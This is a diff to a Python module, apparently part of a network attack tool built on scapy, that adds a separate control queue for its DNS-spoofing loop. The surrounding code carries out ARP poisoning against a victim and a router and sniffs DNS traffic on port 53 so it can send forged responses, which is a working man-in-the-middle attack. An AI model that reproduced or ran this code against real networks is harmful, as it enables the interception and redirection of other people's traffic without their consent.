@@ -9,18 +9,28 @@ from scapy.all import *
 
 logger = logging.getLogger()
 q = Queue.Queue()
+q_d = Queue.Queue()
 
 
-def set_queue(set_q):
-    q.put(set_q)
+def set_queue(set_q, d=False):
+    if not d:
+        q.put(set_q)
+    else:
+        q_d.put(set_q)
 
 
-def get_queue():
-    q.get(False)
+def get_queue(d=False):
+    if not d:
+        q.get(False)
+    else:
+        q_d.get(False)
 
 
-def clear_queue():
-    q.queue.clear()
+def clear_queue(d=False):
+    if not d:
+        q.queue.clear()
+    else:
+        q_d.queue.clear()
 
 
 # Converts the byte formats that scapy returns to something we can read
@@ -82,7 +92,6 @@ def get_mac(source, dest):
     mac = scapy.all.sr(scapy.all.ARP(op=1, psrc=source, pdst=dest))
     sys.stdout = sys.__stdout__
     for s, r in mac[0][ARP]:
-        logging.info(r.hwsrc)
         return r.hwsrc
 
 
@@ -134,7 +143,7 @@ def arp_poison(victim_ip, victim_mac, router_ip, router_mac, attacker_mac, itera
         try:
             msg = q.get(False)
             if msg == 'stop':
-                q.put("dns_stop")
+                q_d.put("dns_stop")
                 break
             else:
                 q.put(msg)
@@ -157,16 +166,17 @@ def arp_poison_stealthy(victim_ip, victim_mac, router_ip, attacker_mac):
 # Give the interface of the network, the IP address to spoof a certain IP, if spoof_all is false.
 def dns_spoofing(interface, ip, spoof_all=True):
     logger.info("Starting DNS spoofing")
-    while 1:
+    dns = True
+    while dns:
         try:
-            msg = q.get(False)
+            msg = q_d.get(False)
+            logger.info(msg)
             if msg == 'dns_stop':
-                logger.info("DNS Spoofing stopped")
-                break
+                logger.info("Stopping DNS Spoofing")
+                dns = False
             else:
-                q.put(msg)
+                q_d.put(msg)
         except Queue.Empty:
-            logger.info(interface)
             dns_packet = scapy.all.sniff(iface=interface, filter="dst port 53", count=1)
             logger.info("Packet found. Spoofing DNS packet")
 
@@ -201,5 +211,5 @@ def dns_spoofing(interface, ip, spoof_all=True):
             logger.info("Sending altered packet")
 
     logger.info("DNS Spoofing stopped")
-    sys.exit(1)
+    sys.exit(0)
 
